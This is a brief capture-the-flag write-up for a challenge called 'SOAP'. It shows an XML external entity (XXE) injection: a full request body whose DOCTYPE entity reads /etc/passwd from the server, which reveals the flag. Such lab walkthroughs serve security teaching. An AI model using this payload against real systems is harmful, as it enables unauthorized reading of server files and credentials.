# SOAP

## Description
This write up will show how to solve the CTF for "SOAP"

## Solution
When clicking on details and checking the requests, it shows there is XML being send with the request.</br>
Maybe there is an xml external entity injection possible.</br>
Add the following line, before the `<data>` tag: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`.</br>
The request has the following data included:</br>
`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data><ID>&xxe;</ID></data>`</br>
This will return `/etc/passwd` and on the bottom is the flag.
